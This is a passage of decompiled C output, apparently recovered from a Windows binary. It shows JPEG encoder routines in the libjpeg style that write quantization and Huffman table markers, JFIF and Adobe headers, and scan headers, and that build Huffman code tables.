  if (*(char *)(iVar2 + 0x80) == '\0') {
    FUN_0040a95b(0xdb);
    FUN_0040a975();
    FUN_0040a930(bVar3 * '\x10' + (char)in_EAX);
    local_c = &DAT_00424bb8;
    do {
      uVar1 = *(undefined2 *)(iVar2 + *local_c * 2);
      if (bVar3) {
        FUN_0040a930((char)((ushort)uVar1 >> 8));
      }
      FUN_0040a930((char)uVar1);
      local_c = local_c + 1;
    } while ((int)local_c < 0x424cb8);
    *(undefined *)(iVar2 + 0x80) = 1;
  }
  return bVar3;
}



void __cdecl FUN_0040aa63(int param_1,char param_2)

{
  int *in_EAX;
  int iVar1;
  int iVar2;
  int iVar3;
  
  if (param_2 == '\0') {
    iVar3 = in_EAX[param_1 + 0x16];
  }
  else {
    iVar3 = in_EAX[param_1 + 0x1a];
    param_1 = param_1 + 0x10;
  }
  if (iVar3 == 0) {
    *(undefined4 *)(*in_EAX + 0x14) = 0x32;
    *(int *)(*in_EAX + 0x18) = param_1;
    (**(code **)*in_EAX)();
  }
  if (*(char *)(iVar3 + 0x111) == '\0') {
    FUN_0040a95b(0xc4);
    iVar2 = 0;
    iVar1 = 1;
    do {
      iVar2 = iVar2 + (uint)*(byte *)(iVar1 + iVar3);
      iVar1 = iVar1 + 1;
    } while (iVar1 < 0x11);
    FUN_0040a975();
    FUN_0040a930((char)param_1);
    _param_2 = 1;
    do {
      FUN_0040a930(*(undefined *)(_param_2 + iVar3));
      _param_2 = _param_2 + 1;
    } while (_param_2 < 0x11);
    _param_2 = 0;
    if (0 < iVar2) {
      do {
        FUN_0040a930(*(undefined *)(iVar3 + 0x11 + _param_2));
        _param_2 = _param_2 + 1;
      } while (_param_2 < iVar2);
    }
    *(undefined *)(iVar3 + 0x111) = 1;
  }
  return;
}



void FUN_0040ab20(void)

{
  FUN_0040a95b(0xdd);
  FUN_0040a975();
  FUN_0040a975();
  return;
}



void __cdecl FUN_0040ab44(undefined4 param_1)

{
  int *in_EAX;
  int iVar1;
  undefined4 *puVar2;
  
  FUN_0040a95b(param_1);
  FUN_0040a975();
  if ((0xffff < in_EAX[8]) || (0xffff < in_EAX[7])) {
    *(undefined4 *)(*in_EAX + 0x14) = 0x29;
    *(undefined4 *)(*in_EAX + 0x18) = 0xffff;
    (**(code **)*in_EAX)();
  }
  FUN_0040a930((char)in_EAX[0xe]);
  FUN_0040a975();
  FUN_0040a975();
  FUN_0040a930((char)in_EAX[0xf]);
  puVar2 = (undefined4 *)in_EAX[0x11];
  iVar1 = 0;
  if (0 < in_EAX[0xf]) {
    do {
      FUN_0040a930((char)*puVar2);
      FUN_0040a930((char)puVar2[2] * '\x10' + (char)puVar2[3]);
      FUN_0040a930((char)puVar2[4]);
      iVar1 = iVar1 + 1;
      puVar2 = puVar2 + 0x15;
    } while (iVar1 < in_EAX[0xf]);
  }
  return;
}



void FUN_0040abe4(void)

{
  undefined4 *puVar1;
  char cVar2;
  char cVar3;
  int in_EAX;
  int *piVar4;
  char cVar5;
  int local_8;
  
  FUN_0040a95b(0xda);
  FUN_0040a975();
  FUN_0040a930((char)*(undefined4 *)(in_EAX + 0xe4));
  local_8 = 0;
  if (0 < *(int *)(in_EAX + 0xe4)) {
    piVar4 = (int *)(in_EAX + 0xe8);
    do {
      puVar1 = (undefined4 *)*piVar4;
      FUN_0040a930((char)*puVar1);
      cVar3 = (char)puVar1[5];
      cVar5 = (char)puVar1[6];
      if (*(char *)(in_EAX + 0xd4) != '\0') {
        cVar2 = cVar5;
        if (*(int *)(in_EAX + 300) == 0) {
          cVar5 = '\0';
          if ((*(int *)(in_EAX + 0x134) == 0) || (cVar2 = '\0', *(char *)(in_EAX + 0xb1) != '\0'))
          goto LAB_0040ac5f;
        }
        cVar5 = cVar2;
        cVar3 = '\0';
      }
LAB_0040ac5f:
      FUN_0040a930(cVar3 * '\x10' + cVar5);
      local_8 = local_8 + 1;
      piVar4 = piVar4 + 1;
    } while (local_8 < *(int *)(in_EAX + 0xe4));
  }
  FUN_0040a930((char)*(undefined4 *)(in_EAX + 300));
  FUN_0040a930((char)*(undefined4 *)(in_EAX + 0x130));
  FUN_0040a930((char)*(undefined4 *)(in_EAX + 0x134) * '\x10' +
               (char)*(undefined4 *)(in_EAX + 0x138));
  return;
}



void FUN_0040acaf(void)

{
  int in_EAX;
  
  FUN_0040a95b(0xe0);
  FUN_0040a975();
  FUN_0040a930(0x4a);
  FUN_0040a930(0x46);
  FUN_0040a930(0x49);
  FUN_0040a930(0x46);
  FUN_0040a930(0);
  FUN_0040a930(*(undefined *)(in_EAX + 0xc5));
  FUN_0040a930(*(undefined *)(in_EAX + 0xc6));
  FUN_0040a930(*(undefined *)(in_EAX + 199));
  FUN_0040a975();
  FUN_0040a975();
  FUN_0040a930(0);
  FUN_0040a930(0);
  return;
}



void FUN_0040ad3f(void)

{
  int in_EAX;
  undefined uVar1;
  
  FUN_0040a95b(0xee);
  FUN_0040a975();
  FUN_0040a930(0x41);
  FUN_0040a930(100);
  FUN_0040a930(0x6f);
  FUN_0040a930(0x62);
  FUN_0040a930(0x65);
  FUN_0040a975();
  FUN_0040a975();
  FUN_0040a975();
  if (*(int *)(in_EAX + 0x40) == 3) {
    uVar1 = 1;
  }
  else if (*(int *)(in_EAX + 0x40) == 5) {
    uVar1 = 2;
  }
  else {
    uVar1 = 0;
  }
  FUN_0040a930(uVar1);
  return;
}



void __cdecl FUN_0040adb6(int *param_1,undefined param_2,uint param_3)

{
  undefined3 in_stack_00000009;
  
  if (0xfffd < param_3) {
    *(undefined4 *)(*param_1 + 0x14) = 0xb;
    (**(code **)*param_1)(param_1);
  }
  FUN_0040a95b(_param_2);
  FUN_0040a975();
  return;
}



void __cdecl FUN_0040ae00(int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(param_1 + 0x14c);
  FUN_0040a95b(0xd8);
  *(undefined4 *)(iVar1 + 0x1c) = 0;
  if (*(char *)(param_1 + 0xc4) != '\0') {
    FUN_0040acaf();
  }
  if (*(char *)(param_1 + 0xcc) != '\0') {
    FUN_0040ad3f();
    return;
  }
  return;
}



void __cdecl FUN_0040ae41(int *param_1)

{
  bool bVar1;
  char cVar2;
  undefined3 extraout_var;
  int *piVar3;
  int iVar4;
  undefined4 uVar5;
  int local_8;
  
  iVar4 = 0;
  local_8 = 0;
  if (0 < param_1[0xf]) {
    do {
      cVar2 = FUN_0040a99a(param_1);
      local_8 = local_8 + CONCAT31(extraout_var,cVar2);
      iVar4 = iVar4 + 1;
    } while (iVar4 < param_1[0xf]);
  }
  if (((*(char *)((int)param_1 + 0xb1) == '\0') && (*(char *)(param_1 + 0x35) == '\0')) &&
     (param_1[0xe] == 8)) {
    iVar4 = param_1[0xf];
    bVar1 = true;
    if (0 < iVar4) {
      piVar3 = (int *)(param_1[0x11] + 0x18);
      do {
        if ((1 < piVar3[-1]) || (1 < *piVar3)) {
          bVar1 = false;
        }
        piVar3 = piVar3 + 0x15;
        iVar4 = iVar4 + -1;
      } while (iVar4 != 0);
    }
    if ((local_8 != 0) && (bVar1)) {
      *(undefined4 *)(*param_1 + 0x14) = 0x4b;
      bVar1 = false;
      (**(code **)(*param_1 + 4))(param_1,0);
    }
  }
  else {
    bVar1 = false;
  }
  if (*(char *)((int)param_1 + 0xb1) == '\0') {
    if (*(char *)(param_1 + 0x35) == '\0') {
      if (bVar1) {
        uVar5 = 0xc0;
      }
      else {
        uVar5 = 0xc1;
      }
    }
    else {
      uVar5 = 0xc2;
    }
  }
  else {
    uVar5 = 0xc9;
  }
  FUN_0040ab44(uVar5);
  return;
}



void __cdecl FUN_0040af0a(int *param_1)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  char cVar4;
  int local_8;
  
  piVar2 = param_1;
  iVar1 = param_1[0x53];
  if ((*(char *)((int)param_1 + 0xb1) == '\0') && (local_8 = 0, 0 < param_1[0x39])) {
    param_1 = param_1 + 0x3a;
    do {
      iVar3 = *param_1;
      if (*(char *)(piVar2 + 0x35) == '\0') {
        FUN_0040aa63(*(int *)(iVar3 + 0x14),'\0');
        FUN_0040aa63(*(int *)(iVar3 + 0x18),'\x01');
      }
      else {
        if (piVar2[0x4b] == 0) {
          if (piVar2[0x4d] != 0) goto LAB_0040af89;
          cVar4 = '\0';
          iVar3 = *(int *)(iVar3 + 0x14);
        }
        else {
          cVar4 = '\x01';
          iVar3 = *(int *)(iVar3 + 0x18);
        }
        FUN_0040aa63(iVar3,cVar4);
      }
LAB_0040af89:
      local_8 = local_8 + 1;
      param_1 = param_1 + 1;
    } while (local_8 < piVar2[0x39]);
  }
  if (piVar2[0x2f] != *(int *)(iVar1 + 0x1c)) {
    FUN_0040ab20();
    *(int *)(iVar1 + 0x1c) = piVar2[0x2f];
  }
  FUN_0040abe4();
  return;
}



void __cdecl FUN_0040afd4(int *param_1)

{
  int iVar1;
  int *piVar2;
  
  FUN_0040a95b(0xd8);
  iVar1 = 0;
  piVar2 = param_1 + 0x12;
  do {
    if (*piVar2 != 0) {
      FUN_0040a99a(param_1);
    }
    iVar1 = iVar1 + 1;
    piVar2 = piVar2 + 1;
  } while (iVar1 < 4);
  if (*(char *)((int)param_1 + 0xb1) == '\0') {
    iVar1 = 0;
    piVar2 = param_1 + 0x1a;
    do {
      if (piVar2[-4] != 0) {
        FUN_0040aa63(iVar1,'\0');
      }
      if (*piVar2 != 0) {
        FUN_0040aa63(iVar1,'\x01');
      }
      iVar1 = iVar1 + 1;
      piVar2 = piVar2 + 1;
    } while (iVar1 < 4);
  }
  FUN_0040a95b(0xd9);
  return;
}



void __cdecl FUN_0040b04e(int param_1)

{
  code **ppcVar1;
  
  ppcVar1 = (code **)(***(code ***)(param_1 + 4))(param_1,1,0x20);
  *(code ***)(param_1 + 0x14c) = ppcVar1;
  ppcVar1[7] = (code *)0x0;
  *ppcVar1 = FUN_0040ae00;
  ppcVar1[1] = FUN_0040ae41;
  ppcVar1[2] = FUN_0040af0a;
  ppcVar1[3] = (code *)&LAB_0040afc4;
  ppcVar1[4] = FUN_0040afd4;
  ppcVar1[5] = FUN_0040adb6;
  ppcVar1[6] = (code *)&LAB_0040adef;
  return;
}



void __cdecl FUN_0040b09c(int *param_1)

{
  char cVar1;
  
  FUN_0040efc6((int)param_1,'\0');
  if (*(char *)(param_1 + 0x2c) == '\0') {
    FUN_0040e50c(param_1);
    FUN_0040df7c(param_1);
    FUN_0040d81f(param_1,'\0');
  }
  FUN_0040d35f(param_1);
  if (*(char *)((int)param_1 + 0xb1) == '\0') {
    if (*(char *)(param_1 + 0x35) == '\0') {
      FUN_0040c567((int)param_1);
    }
    else {
      FUN_0040cf5b((int)param_1);
    }
  }
  else {
    *(undefined4 *)(*param_1 + 0x14) = 1;
    (**(code **)*param_1)();
  }
  if ((param_1[0x2a] < 2) && (*(char *)((int)param_1 + 0xb2) == '\0')) {
    cVar1 = '\0';
  }
  else {
    cVar1 = '\x01';
  }
  FUN_0040b8c1((int)param_1,cVar1);
  FUN_0040b243(param_1,'\0');
  FUN_0040b04e((int)param_1);
  (**(code **)(param_1[1] + 0x18))(param_1);
  (**(code **)param_1[0x53])(param_1);
  return;
}



void __cdecl FUN_0040b141(undefined4 param_1,void *param_2)

{
  _free(param_2);
  return;
}



void __cdecl FUN_0040b14c(undefined4 param_1,size_t param_2)

{
  _malloc(param_2);
  return;
}



undefined4 __cdecl FUN_0040b157(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  return param_3;
}



void __cdecl FUN_0040b15c(int *param_1)

{
  *(undefined4 *)(*param_1 + 0x14) = 0x31;
  (**(code **)*param_1)(param_1);
  return;
}



undefined4 FUN_0040b170(void)

{
  return 0;
}



void __cdecl FUN_0040b173(int param_1,undefined4 param_2,int *param_3,undefined4 param_4)

{
  uint *puVar1;
  int iVar2;
  uint uVar3;
  char cVar4;
  
  iVar2 = *(int *)(param_1 + 0x140);
  if (*(uint *)(iVar2 + 8) < *(uint *)(param_1 + 0xe0)) {
    puVar1 = (uint *)(iVar2 + 0xc);
    do {
      uVar3 = *puVar1;
      if (uVar3 < 8) {
        (**(code **)(*(int *)(param_1 + 0x144) + 4))
                  (param_1,param_2,param_3,param_4,iVar2 + 0x18,puVar1,8);
        uVar3 = *puVar1;
      }
      if (uVar3 != 8) {
        return;
      }
      cVar4 = (**(code **)(*(int *)(param_1 + 0x148) + 4))(param_1,iVar2 + 0x18);
      if (cVar4 == '\0') {
        if (*(char *)(iVar2 + 0x10) != '\0') {
          return;
        }
        *param_3 = *param_3 + -1;
        *(undefined *)(iVar2 + 0x10) = 1;
        return;
      }
      if (*(char *)(iVar2 + 0x10) != '\0') {
        *param_3 = *param_3 + 1;
        *(undefined *)(iVar2 + 0x10) = 0;
      }
      *puVar1 = 0;
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
    } while (*(uint *)(iVar2 + 8) < *(uint *)(param_1 + 0xe0));
  }
  return;
}



void __cdecl FUN_0040b243(int *param_1,char param_2)

{
  int *piVar1;
  int *piVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  int *piVar5;
  
  piVar2 = param_1;
  puVar3 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0x40);
  param_1[0x50] = (int)puVar3;
  *puVar3 = &LAB_0040b201;
  if (*(char *)(param_1 + 0x2c) == '\0') {
    if (param_2 == '\0') {
      piVar5 = param_1 + 0xf;
      piVar1 = param_1 + 0x11;
      param_1 = (int *)0x0;
      if (0 < *piVar5) {
        piVar5 = (int *)(*piVar1 + 0x1c);
        puVar3 = puVar3 + 6;
        do {
          uVar4 = (**(code **)(piVar2[1] + 8))(piVar2,1,*piVar5 << 3,piVar5[-4] << 3);
          param_1 = (int *)((int)param_1 + 1);
          *puVar3 = uVar4;
          puVar3 = puVar3 + 1;
          piVar5 = piVar5 + 0x15;
        } while ((int)param_1 < piVar2[0xf]);
      }
    }
    else {
      *(undefined4 *)(*param_1 + 0x14) = 4;
      (**(code **)*param_1)(param_1);
    }
  }
  return;
}



void __fastcall FUN_0040b2c7(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 0x148);
  if (*(int *)(param_1 + 0xe4) < 2) {
    if (*(uint *)(iVar1 + 8) < *(int *)(param_1 + 0xe0) - 1U) {
      uVar2 = *(undefined4 *)(*(int *)(param_1 + 0xe8) + 0xc);
    }
    else {
      uVar2 = *(undefined4 *)(*(int *)(param_1 + 0xe8) + 0x48);
    }
    *(undefined4 *)(iVar1 + 0x14) = uVar2;
  }
  else {
    *(undefined4 *)(iVar1 + 0x14) = 1;
  }
  *(undefined4 *)(iVar1 + 0xc) = 0;
  *(undefined4 *)(iVar1 + 0x10) = 0;
  return;
}



undefined4 __cdecl FUN_0040b303(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  char cVar6;
  int iVar7;
  undefined4 *puVar8;
  int iVar9;
  undefined4 uVar10;
  uint uVar11;
  int iVar12;
  int iVar13;
  int *piVar14;
  int local_20;
  int local_1c;
  int local_18;
  int local_8;
  
  iVar1 = *(int *)(param_1 + 0xe0);
  uVar11 = *(int *)(param_1 + 0xf8) - 1;
  iVar2 = *(int *)(param_1 + 0x148);
  iVar9 = *(int *)(iVar2 + 0x10);
  do {
    if (*(int *)(iVar2 + 0x14) <= iVar9) {
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
      uVar10 = FUN_0040b2c7(param_1);
      return CONCAT31((int3)((uint)uVar10 >> 8),1);
    }
    for (uVar3 = *(uint *)(iVar2 + 0xc); uVar3 <= uVar11; uVar3 = uVar3 + 1) {
      iVar13 = 0;
      local_20 = 0;
      if (0 < *(int *)(param_1 + 0xe4)) {
        piVar14 = (int *)(param_1 + 0xe8);
        do {
          iVar4 = *piVar14;
          if (uVar3 < uVar11) {
            iVar12 = *(int *)(iVar4 + 0x34);
          }
          else {
            iVar12 = *(int *)(iVar4 + 0x44);
          }
          local_18 = 0;
          iVar5 = *(int *)(iVar4 + 0x40);
          local_1c = iVar9 << 3;
          if (0 < *(int *)(iVar4 + 0x38)) {
            iVar7 = *(int *)(iVar4 + 0x34);
            do {
              if ((*(uint *)(iVar2 + 8) < iVar1 - 1U) || (local_18 + iVar9 < *(int *)(iVar4 + 0x48))
                 ) {
                (**(code **)(*(int *)(param_1 + 0x158) + 4))
                          (param_1,iVar4,*(undefined4 *)(param_2 + *(int *)(iVar4 + 4) * 4),
                           *(undefined4 *)(iVar2 + 0x18 + iVar13 * 4),local_1c,iVar5 * uVar3,iVar12)
                ;
                if ((iVar12 < *(int *)(iVar4 + 0x34)) &&
                   (FUN_00409e93(*(void **)(iVar2 + 0x18 + (iVar12 + iVar13) * 4),
                                 (*(int *)(iVar4 + 0x34) - iVar12) * 0x80),
                   iVar12 < *(int *)(iVar4 + 0x34))) {
                  puVar8 = (undefined4 *)(iVar2 + 0x18 + (iVar12 + iVar13) * 4);
                  local_8 = iVar12;
                  do {
                    local_8 = local_8 + 1;
                    *(undefined2 *)*puVar8 = *(undefined2 *)puVar8[-1];
                    puVar8 = puVar8 + 1;
                  } while (local_8 < *(int *)(iVar4 + 0x34));
                }
              }
              else {
                FUN_00409e93(*(void **)(iVar2 + 0x18 + iVar13 * 4),iVar7 << 7);
                local_8 = 0;
                if (0 < *(int *)(iVar4 + 0x34)) {
                  puVar8 = (undefined4 *)(iVar2 + 0x18 + iVar13 * 4);
                  do {
                    local_8 = local_8 + 1;
                    *(undefined2 *)*puVar8 = **(undefined2 **)(iVar2 + 0x14 + iVar13 * 4);
                    puVar8 = puVar8 + 1;
                  } while (local_8 < *(int *)(iVar4 + 0x34));
                }
              }
              iVar7 = *(int *)(iVar4 + 0x34);
              local_1c = local_1c + 8;
              iVar13 = iVar13 + iVar7;
              local_18 = local_18 + 1;
            } while (local_18 < *(int *)(iVar4 + 0x38));
          }
          local_20 = local_20 + 1;
          piVar14 = piVar14 + 1;
        } while (local_20 < *(int *)(param_1 + 0xe4));
      }
      cVar6 = (**(code **)(*(int *)(param_1 + 0x15c) + 4))(param_1,iVar2 + 0x18);
      if (cVar6 == '\0') {
        *(int *)(iVar2 + 0x10) = iVar9;
        *(uint *)(iVar2 + 0xc) = uVar3;
        return uVar3 & 0xffffff00;
      }
    }
    *(undefined4 *)(iVar2 + 0xc) = 0;
    iVar9 = iVar9 + 1;
  } while( true );
}



undefined4 __cdecl FUN_0040b4ec(int param_1)

{
  int iVar1;
  int iVar2;
  char cVar3;
  int iVar4;
  undefined4 uVar5;
  int iVar6;
  int iVar7;
  int *piVar8;
  uint uVar9;
  int aiStack_34 [4];
  uint local_24;
  int *local_20;
  int local_1c;
  int *local_18;
  int local_14;
  int local_10;
  int local_c;
  int *local_8;
  
  iVar2 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(iVar2 + 0x148);
  if (0 < *(int *)(iVar2 + 0xe4)) {
    local_8 = (int *)(iVar2 + 0xe8);
    do {
      iVar4 = *(int *)(*local_8 + 0xc);
      iVar4 = (**(code **)(*(int *)(iVar2 + 4) + 0x20))
                        (iVar2,*(undefined4 *)(iVar1 + 0x40 + *(int *)(*local_8 + 4) * 4),
                         *(int *)(iVar1 + 8) * iVar4,iVar4,0);
      local_8 = local_8 + 1;
      aiStack_34[param_1] = iVar4;
      param_1 = param_1 + 1;
    } while (param_1 < *(int *)(iVar2 + 0xe4));
  }
  local_8 = *(int **)(iVar1 + 0x10);
  do {
    if (*(int *)(iVar1 + 0x14) <= (int)local_8) {
      *(int *)(iVar1 + 8) = *(int *)(iVar1 + 8) + 1;
      uVar5 = FUN_0040b2c7(iVar2);
      return CONCAT31((int3)((uint)uVar5 >> 8),1);
    }
    uVar9 = *(uint *)(iVar1 + 0xc);
    local_24 = uVar9;
    if (uVar9 < *(uint *)(iVar2 + 0xf8)) {
      do {
        local_10 = 0;
        param_1 = 0;
        if (0 < *(int *)(iVar2 + 0xe4)) {
          local_20 = (int *)(iVar2 + 0xe8);
          do {
            iVar4 = *local_20;
            iVar7 = *(int *)(iVar4 + 0x34);
            local_1c = 0;
            if (0 < *(int *)(iVar4 + 0x38)) {
              local_c = iVar7 * uVar9;
              local_c = iVar7 * uVar9 * 0x80;
              local_18 = (int *)(aiStack_34[param_1] + (int)local_8 * 4);
              do {
                iVar6 = *local_18 + local_c;
                local_14 = 0;
                if (0 < iVar7) {
                  piVar8 = (int *)(iVar1 + 0x18 + local_10 * 4);
                  do {
                    local_10 = local_10 + 1;
                    *piVar8 = iVar6;
                    iVar7 = *(int *)(iVar4 + 0x34);
                    piVar8 = piVar8 + 1;
                    iVar6 = iVar6 + 0x80;
                    local_14 = local_14 + 1;
                  } while (local_14 < iVar7);
                }
                local_1c = local_1c + 1;
                local_18 = local_18 + 1;
              } while (local_1c < *(int *)(iVar4 + 0x38));
            }
            param_1 = param_1 + 1;
            local_20 = local_20 + 1;
          } while (param_1 < *(int *)(iVar2 + 0xe4));
        }
        local_24 = uVar9;
        cVar3 = (**(code **)(*(int *)(iVar2 + 0x15c) + 4))(iVar2,iVar1 + 0x18);
        if (cVar3 == '\0') {
          *(int **)(iVar1 + 0x10) = local_8;
          *(uint *)(iVar1 + 0xc) = uVar9;
          return (uint)local_8 & 0xffffff00;
        }
        uVar9 = uVar9 + 1;
        local_24 = uVar9;
      } while (uVar9 < *(uint *)(iVar2 + 0xf8));
    }
    *(undefined4 *)(iVar1 + 0xc) = 0;
    local_8 = (int *)((int)local_8 + 1);
  } while( true );
}



void __cdecl FUN_0040b65a(uint param_1,undefined4 *param_2)

{
  undefined2 uVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  undefined2 *puVar9;
  int iVar10;
  int iVar11;
  uint local_2c;
  int local_20;
  undefined4 *local_1c;
  undefined4 *local_18;
  undefined2 *local_14;
  undefined2 *local_10;
  uint local_8;
  
  uVar4 = param_1;
  local_20 = 0;
  iVar2 = *(int *)(param_1 + 0x148);
  uVar5 = *(int *)(param_1 + 0xe0) - 1;
  iVar11 = *(int *)(param_1 + 0x44);
  if (0 < *(int *)(param_1 + 0x3c)) {
    local_1c = param_2;
    local_18 = (undefined4 *)(iVar2 + 0x40);
    do {
      iVar6 = (**(code **)(*(int *)(uVar4 + 4) + 0x20))
                        (uVar4,*local_18,*(int *)(iVar2 + 8) * *(int *)(iVar11 + 0xc),
                         *(int *)(iVar11 + 0xc),1);
      if (*(uint *)(iVar2 + 8) < uVar5) {
        local_10 = (undefined2 *)*(uint *)(iVar11 + 0xc);
      }
      else {
        local_10 = (undefined2 *)(*(uint *)(iVar11 + 0x20) % *(uint *)(iVar11 + 0xc));
        if (local_10 == (undefined2 *)0x0) {
          local_10 = (undefined2 *)*(uint *)(iVar11 + 0xc);
        }
      }
      uVar7 = *(uint *)(iVar11 + 0x1c);
      uVar3 = *(uint *)(iVar11 + 8);
      local_8 = uVar7 % uVar3;
      if (0 < (int)local_8) {
        local_8 = uVar3 - local_8;
      }
      param_1 = 0;
      if (0 < (int)local_10) {
        do {
          iVar10 = *(int *)(iVar6 + param_1 * 4);
          (**(code **)(*(int *)(uVar4 + 0x158) + 4))
                    (uVar4,iVar11,*local_1c,iVar10,param_1 << 3,0,uVar7);
          if (0 < (int)local_8) {
            puVar9 = (undefined2 *)(iVar10 + uVar7 * 0x80);
            FUN_00409e93(puVar9,local_8 << 7);
            uVar1 = puVar9[-0x40];
            uVar8 = local_8;
            if (0 < (int)local_8) {
              do {
                *puVar9 = uVar1;
                puVar9 = puVar9 + 0x40;
                uVar8 = uVar8 - 1;
              } while (uVar8 != 0);
            }
          }
          param_1 = param_1 + 1;
        } while ((int)param_1 < (int)local_10);
      }
      if (*(uint *)(iVar2 + 8) == uVar5) {
        uVar7 = uVar7 + local_8;
        uVar8 = uVar7 / uVar3;
        param_1 = (uint)local_10;
        if ((int)local_10 < *(int *)(iVar11 + 0xc)) {
          do {
            local_10 = *(undefined2 **)(param_1 * 4 + iVar6);
            iVar10 = *(int *)(param_1 * 4 + -4 + iVar6);
            FUN_00409e93(local_10,uVar7 * 0x80);
            if (uVar8 != 0) {
              local_2c = uVar8;
              do {
                uVar1 = *(undefined2 *)(uVar3 * 0x80 + -0x80 + iVar10);
                if (0 < (int)uVar3) {
                  local_14 = local_10;
                  local_8 = uVar3;
                  do {
                    local_8 = local_8 - 1;
                    *local_14 = uVar1;
                    local_14 = local_14 + 0x40;
                  } while (local_8 != 0);
                }
                local_10 = local_10 + uVar3 * 0x40;
                iVar10 = iVar10 + uVar3 * 0x80;
                local_2c = local_2c - 1;
              } while (local_2c != 0);
            }
            param_1 = param_1 + 1;
          } while ((int)param_1 < *(int *)(iVar11 + 0xc));
        }
      }
      local_20 = local_20 + 1;
      local_18 = local_18 + 1;
      local_1c = local_1c + 1;
      iVar11 = iVar11 + 0x54;
    } while (local_20 < *(int *)(uVar4 + 0x3c));
  }
  FUN_0040b4ec(uVar4);
  return;
}



void __cdecl FUN_0040b82f(int *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = param_1[0x52];
  *(undefined4 *)(iVar1 + 8) = 0;
  FUN_0040b2c7((int)param_1);
  if (param_2 == 0) {
    if (*(int *)(iVar1 + 0x40) != 0) {
      *(undefined4 *)(*param_1 + 0x14) = 4;
      (**(code **)*param_1)(param_1);
    }
    *(code **)(iVar1 + 4) = FUN_0040b303;
  }
  else if (param_2 == 2) {
    if (*(int *)(iVar1 + 0x40) == 0) {
      *(undefined4 *)(*param_1 + 0x14) = 4;
      (**(code **)*param_1)(param_1);
    }
    *(code **)(iVar1 + 4) = FUN_0040b4ec;
  }
  else if (param_2 == 3) {
    if (*(int *)(iVar1 + 0x40) == 0) {
      *(undefined4 *)(*param_1 + 0x14) = 4;
      (**(code **)*param_1)(param_1);
    }
    *(code **)(iVar1 + 4) = FUN_0040b65a;
  }
  else {
    *(undefined4 *)(*param_1 + 0x14) = 4;
    (**(code **)*param_1)(param_1);
  }
  return;
}



void __cdecl FUN_0040b8c1(int param_1,char param_2)

{
  int iVar1;
  code **ppcVar2;
  int iVar3;
  int iVar4;
  code *pcVar5;
  code **ppcVar6;
  int iVar7;
  int *piVar8;
  int iVar9;
  
  iVar7 = param_1;
  ppcVar2 = (code **)(***(code ***)(param_1 + 4))(param_1,1,0x68);
  *(code ***)(param_1 + 0x148) = ppcVar2;
  *ppcVar2 = FUN_0040b82f;
  if (param_2 == '\0') {
    pcVar5 = (code *)(**(code **)(*(int *)(param_1 + 4) + 4))(param_1,1,0x500);
    ppcVar6 = ppcVar2 + 6;
    iVar7 = 10;
    do {
      *ppcVar6 = pcVar5;
      ppcVar6 = ppcVar6 + 1;
      pcVar5 = pcVar5 + 0x80;
      iVar7 = iVar7 + -1;
    } while (iVar7 != 0);
    ppcVar2[0x10] = (code *)0x0;
  }
  else {
    param_1 = 0;
    if (0 < *(int *)(iVar7 + 0x3c)) {
      piVar8 = (int *)(*(int *)(iVar7 + 0x44) + 0xc);
      _param_2 = ppcVar2 + 0x10;
      do {
        iVar9 = *piVar8;
        iVar1 = *(int *)(iVar7 + 4);
        iVar3 = FUN_00409e3d(piVar8[5],iVar9);
        iVar4 = FUN_00409e3d(piVar8[4],piVar8[-1]);
        pcVar5 = (code *)(**(code **)(iVar1 + 0x14))(iVar7,1,0,iVar4,iVar3,iVar9);
        param_1 = param_1 + 1;
        *_param_2 = pcVar5;
        piVar8 = piVar8 + 0x15;
        _param_2 = _param_2 + 1;
      } while (param_1 < *(int *)(iVar7 + 0x3c));
    }
  }
  return;
}



void __cdecl FUN_0040b971(int *param_1,char param_2,int param_3,int *param_4)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  uint uVar4;
  int iVar5;
  int aiStack_520 [257];
  int local_11c;
  int local_118;
  int local_114;
  int local_110;
  char local_10c [260];
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  if ((param_3 < 0) || (3 < param_3)) {
    *(undefined4 *)(*param_1 + 0x14) = 0x32;
    *(int *)(*param_1 + 0x18) = param_3;
    (**(code **)*param_1)(param_1);
  }
  if (param_2 == '\0') {
    local_114 = param_1[param_3 + 0x1a];
  }
  else {
    local_114 = param_1[param_3 + 0x16];
  }
  if (local_114 == 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x32;
    *(int *)(*param_1 + 0x18) = param_3;
    (**(code **)*param_1)(param_1);
  }
  if (*param_4 == 0) {
    iVar2 = (**(code **)param_1[1])(param_1,1,0x500);
    *param_4 = iVar2;
  }
  local_118 = *param_4;
  iVar2 = 0;
  local_110 = 1;
  do {
    uVar4 = (uint)*(byte *)(local_110 + local_114);
    if (0x100 < (int)(uVar4 + iVar2)) {
      *(undefined4 *)(*param_1 + 0x14) = 8;
      (**(code **)*param_1)(param_1);
    }
    if (uVar4 != 0) {
      _memset(local_10c + iVar2,local_110,uVar4);
      iVar2 = iVar2 + uVar4;
    }
    local_110 = local_110 + 1;
  } while (local_110 < 0x11);
  local_10c[iVar2] = '\0';
  iVar5 = (int)local_10c[0];
  local_11c = iVar2;
  iVar2 = 0;
  local_110 = 0;
  if (local_10c[0] != '\0') {
    pcVar3 = local_10c;
    do {
      cVar1 = *pcVar3;
      while (cVar1 == iVar5) {
        aiStack_520[iVar2] = local_110;
        cVar1 = local_10c[iVar2 + 1];
        iVar2 = iVar2 + 1;
        local_110 = local_110 + 1;
      }
      if (1 << ((byte)iVar5 & 0x1f) <= local_110) {
        *(undefined4 *)(*param_1 + 0x14) = 8;
        (**(code **)*param_1)(param_1);
      }
      local_110 = local_110 << 1;
      pcVar3 = local_10c + iVar2;
      iVar5 = iVar5 + 1;
    } while (*pcVar3 != '\0');
  }
